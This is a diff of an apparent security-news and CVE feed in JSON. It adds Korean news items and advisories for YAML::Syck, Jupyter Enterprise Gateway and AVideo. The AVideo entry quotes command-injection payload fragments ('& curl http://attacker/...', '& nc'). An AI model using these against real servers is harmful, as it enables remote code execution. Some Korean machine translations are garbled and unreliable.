@@ -1,6 +1,18 @@
 {
-  "fetched_at": "2026-07-17T08:01:41.896215+09:00",
+  "fetched_at": "2026-07-17T08:31:55.710219+09:00",
   "security_news": [
+    {
+      "title": "(20일)[2026 안티랜섬웨어 솔루션 리포트] “복호화 시대는 끝?” 랜섬웨...",
+      "summary": "특히 최고 관리자 권한 탈취를 가정한 모의 해킹 공격(Red Team Test)에서도 백업 삭제 및 암호화 시도를 전건 방어해내며 독보적인 사이버 복원력을 입증 했다.[안티랜섬웨어 솔루션 집중 분석-3 엔피코어]엔피코어...",
+      "content": "",
+      "title_ko": null,
+      "summary_ko": null,
+      "summary_3lines": "1. 엔피코어, 모의 해킹서 백업 삭제/암호화 시도 전건 방어\n2. 관리자 권한 탈취 공격도 막아낸 복원력 입증\n3. 랜섬웨어 복호화 어려운 시대, 안티랜섬웨어 중요성 부각",
+      "link": "http://www.boannews.com/media/view.asp?idx=144719&kind=6",
+      "source": "naver",
+      "published": "2026-07-17T08:24:00+09:00",
+      "lang": "ko"
+    },
     {
       "title": "EU \"구글, 경쟁 AI·검색엔진에 안드로이드 핵심기능 개방하라\"",
       "summary": "\"공정경쟁 촉진 차원\"…구글 \"사이버보안 등 위협\" 반발 현윤경 특파원 = 구글은 1년 내로 안드로이드... 다만 구글은 데이터를 제공하기 전에 특정 데이터를 공개하는 것이 사이버보안이나 개인정보 보호에 위험을...",
@@ -2364,21 +2376,39 @@
       "source": "naver",
       "published": "2026-07-14T09:10:00+09:00",
       "lang": "ko"
-    },
-    {
-      "title": "[김승연의 청년 사다리②] 한화금융, '문 밖 취준생' 불확실성 지운다",
-      "summary": "참가자는 여성의 건강과 생활방식 변화를 보험과 서비스로 연결하는 펨테크(Femtech) 분야와 해킹·랜섬웨어 등 디지털 위험을 다루는 사이버보험 분야 가운데 하나를 선택했다. 마케팅과 브랜딩, 콘텐츠 기획뿐 아니라...",
-      "content": "",
-      "title_ko": null,
-      "summary_ko": null,
-      "summary_3lines": "1. 한화금융, 취준생 대상 펨테크·사이버보험 교육 프로그램 운영\n2. 해킹·랜섬웨어 위험 대응 및 여성 건강 보험 서비스 개발\n3. 마케팅·브랜딩·콘텐츠 기획 역량 강화로 취업 불확실성 완화",
-      "link": "https://www.apnews.kr/news/articleView.html?idxno=3049743",
-      "source": "naver",
-      "published": "2026-07-14T08:06:00+09:00",
-      "lang": "ko"
     }
   ],
   "vulnerability": [
+    {
+      "title": "CVE-2026-57076 - YAML::Syck versions before 1.47 for Perl allow a heap use-after-free via an anchor name reused as an anchors-table key in syck_hdlr_add_anchor",
+      "summary": "CVE ID :CVE-2026-57076\n  \nPublished : July 16, 2026, 10:17 p.m. | 39 minutes ago\n  \nDescription :YAML::Syck versions before 1.47 for Perl allow a heap use-after-free via an anchor name reused as an anchors-table key in syck_hdlr_add_anchor.\n\nIn the bundled libsyck an anchor name allocated by syck_strndup is stored both as node->anchor, freed when the node is freed, and as the key in the parser's anchors table. Freeing the node frees the shared key, and a later anchor redefinition makes st_delete compare against the freed key, so st_strcmp reads freed heap memory. Anchors are a standard YAML feature and need no special flags, so this is reached on the default Load path.\n\nAny caller that runs Load or LoadFile on an untrusted document that redefines an anchor reaches the read of freed memory.\n  \nSeverity: 0.0 | NA\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
+      "description": "CVE ID :CVE-2026-57076\n  \nPublished : July 16, 2026, 10:17 p.m. | 39 minutes ago\n  \nDescription :YAML::Syck versions before 1.47 for Perl allow a heap use-after-free via an anchor name reused as an anchors-table key in syck_hdlr_add_anchor.\n\nIn the bundled libsyck an anchor name allocated by syck_strndup is stored both as node->anchor, freed when the node is freed, and as the key in the parser's anchors table. Freeing the node frees the shared key, and a later anchor redefinition makes st_delete compare against the freed key, so st_strcmp reads freed heap memory. Anchors are a standard YAML feature and need no special flags, so this is reached on the default Load path.\n\nAny caller that runs Load or LoadFile on an untrusted document that redefines an anchor reaches the read of freed memory.\n  \nSeverity: 0.0 | NA\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
+      "title_ko": "CVE-2026-57076 - Perl의 1.47 이전 YAML::Syck 버전에서는 syck_hdlr_add_anchor에서 앵커 테이블 키로 재사용되는 앵커 이름을 통해 힙 사용 후 사용을 허용합니다.",
+      "summary_ko": "CVE ID:CVE-2026-57076\n  \n게시일 : 2026년 7월 16일 오후 10시 17분 | 39분 전\n  \n설명 :YAML::Perl의 1.47 이전 버전에서는 syck_hdlr_add_anchor의 앵커 테이블 키로 재사용되는 앵커 이름을 통해 힙 사용 후 사용을 허용합니다.\n\n번들 libsyck에서 syck_strndup에 의해 할당된 앵커 이름은 노드->앵커(노드가 해제될 때 해제됨) 및 파서의 앵커 테이블에 있는 키로 저장됩니다. 노드를 해제하면 공유 키가 해제되고 나중에 앵커를 다시 정의하면 st_delete가 해제된 키와 비교되므로 st_strcmp는 해제된 힙 메모리를 읽습니다. 앵커는 표준 YAML 기능이며 특수 플래그가 필요하지 않으므로 기본 로드 경로에서 도달됩니다.\n\n앵커를 재정의하는 신뢰할 수 없는 문서에서 Load 또는 LoadFile을 실행하는 모든 호출자는 해제된 메모리 읽기에 도달합니다.\n  \n심각도: 0.0 | 해당 없음\n  \n  CVSS 세부 정보, 영향을 받는 제품, 타임라인 등과 같은 자세한 내용을 보려면 링크를 방문하세요.",
+      "summary_3lines": "1. CVE-2026-57076\n2. 26.07.17 오전7:17\n3. YAML::Syck versions before 1.47 for Perl allow a h",
+      "cve_id": "CVE-2026-57076",
+      "cvss": "",
+      "severity": "",
+      "link": "https://cvefeed.io/vuln/detail/CVE-2026-57076",
+      "source": "cvefeed",
+      "published": "2026-07-17T07:17:43+09:00",
+      "lang": "en"
+    },
+    {
+      "title": "CVE-2026-44182 - Jupyter Enterprise Gateway Has Kubernetes Manifest Injection via Jinja2 Template Rendering",
+      "summary": "CVE ID :CVE-2026-44182\n  \nPublished : July 16, 2026, 10:05 p.m. | 52 minutes ago\n  \nDescription :Jupyter Enterprise Gateway launches remote Jupyter Notebook kernels across distributed clusters like Apache Spark, Kubernetes, and Docker Swarm. In versions prior to 3.3.0, the server interpolates untrusted environment variables (e.g., KERNEL_XXX) into Kubernetes manifests without YAML-aware escaping, enabling YAML injection attacks. Attackers can inject new fields, overwrite critical fields (e.g., duplicate securityContext keys, where the last one prevails), and inject document boundaries (--- for new documents, ... for end-of-document) to generate multiple resources, potentially creating arbitrary types, such as privileged pods. The Jinja2 template for the Kubernetes manifest contains several kernel_xxx variables, such as kernel_working_dir that are used when rendering the manifest and are all vectors for YAML injection. This issue has been fixed in version 3.3.0.\n  \nSeverity: 0.0 | NA\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
+      "description": "CVE ID :CVE-2026-44182\n  \nPublished : July 16, 2026, 10:05 p.m. | 52 minutes ago\n  \nDescription :Jupyter Enterprise Gateway launches remote Jupyter Notebook kernels across distributed clusters like Apache Spark, Kubernetes, and Docker Swarm. In versions prior to 3.3.0, the server interpolates untrusted environment variables (e.g., KERNEL_XXX) into Kubernetes manifests without YAML-aware escaping, enabling YAML injection attacks. Attackers can inject new fields, overwrite critical fields (e.g., duplicate securityContext keys, where the last one prevails), and inject document boundaries (--- for new documents, ... for end-of-document) to generate multiple resources, potentially creating arbitrary types, such as privileged pods. The Jinja2 template for the Kubernetes manifest contains several kernel_xxx variables, such as kernel_working_dir that are used when rendering the manifest and are all vectors for YAML injection. This issue has been fixed in version 3.3.0.\n  \nSeverity: 0.0 | NA\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
+      "title_ko": "CVE-2026-44182 - Jupyter Enterprise Gateway에 Jinja2 템플릿 렌더링을 통해 Kubernetes 매니페스트 삽입 기능이 있음",
+      "summary_ko": "CVE ID:CVE-2026-44182\n  \n게시일 : 2026년 7월 16일 오후 10시 5분 | 52분 전\n  \n설명 :Jupyter Enterprise Gateway는 Apache Spark, Kubernetes, Docker Swarm과 같은 분산 클러스터에서 원격 Jupyter Notebook 커널을 시작합니다. 3.3.0 이전 버전에서는 서버가 YAML 인식 이스케이프 없이 신뢰할 수 없는 환경 변수(예: KERNEL_XXX)를 Kubernetes 매니페스트에 보간하여 YAML 주입 공격을 활성화합니다. 공격자는 새 필드를 삽입하고, 중요한 필드를 덮어쓰며(예: 마지막 키가 우선하는 securityContext 키 복제), 문서 경계(새 문서의 경우 ---, 문서 끝의 경우 ...)를 삽입하여 여러 리소스를 생성할 수 있으며 잠재적으로 권한 있는 포드와 같은 임의 유형을 생성할 수 있습니다. Kubernetes 매니페스트용 Jinja2 템플릿에는 매니페스트를 렌더링할 때 사용되며 모두 YAML 주입을 위한 벡터인 kernel_working_dir과 같은 여러 kernel_xxx 변수가 포함되어 있습니다. 이 문제는 버전 3.3.0에서 수정되었습니다.\n  \n심각도: 0.0 | 해당 없음\n  \n  CVSS 세부 정보, 영향을 받는 제품, 타임라인 등과 같은 자세한 내용을 보려면 링크를 방문하세요.",
+      "summary_3lines": "1. CVE-2026-44182\n2. 26.07.17 오전7:05\n3. Jupyter Enterprise Gateway launches remote Jupyter",
+      "cve_id": "CVE-2026-44182",
+      "cvss": "",
+      "severity": "",
+      "link": "https://cvefeed.io/vuln/detail/CVE-2026-44182",
+      "source": "cvefeed",
+      "published": "2026-07-17T07:05:09+09:00",
+      "lang": "en"
+    },
     {
       "title": "CVE-2026-55173 - AVideo incomplete fix for CVE-2026-33482: sanitizeFFmpegCommand still allows a single '&' (background operator), giving OS command execution at the same execAsync sh -c sink",
       "summary": "CVE ID :CVE-2026-55173\n  \nPublished : July 16, 2026, 8:41 p.m. | 36 minutes ago\n  \nDescription :WWBN AVideo is an open source video platform. Versions 29.0 and below remain vulnerable to OS command injection because the fix for CVE-2026-33482 was incomplete and still does not neutralize a single & ( the shell background operator). CVE-2026-33482 reported that sanitizeFFmpegCommand() (plugin/API/standAlone/functions.php) failed to strip $(...) command substitution, allowing OS command injection at the execAsync() sh -c sink. The fix (commit 25c8ab90) added $, (, ), {, }, \\n, \\r to the denylist character class and a str_replace('&&', '', ...), but did not account for the single &. ffmpeg.json.php builds the command from _decryptString(getInput('codeToExecEncrypted')). This is the same threat model the original advisory accepted (“an attacker who can craft a valid encrypted payload can achieve arbitrary command execution on the standalone encoder server”) and the same CVSS basis (AV:N/AC:H/PR:N). Multiple &-separated commands can be chained (e.g. download + execute). Redirect-based payloads are blocked by the > strip, but command execution (e.g. & curl http://attacker/..., & nc ..., dropping/running a file) is not. This issue has been patched by this commit: https://github.com/WWBN/AVideo/commit/c1cfa2bea8a351a1d07f5758f82887403e3abf1f.\n  \nSeverity: 0.0 | NA\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
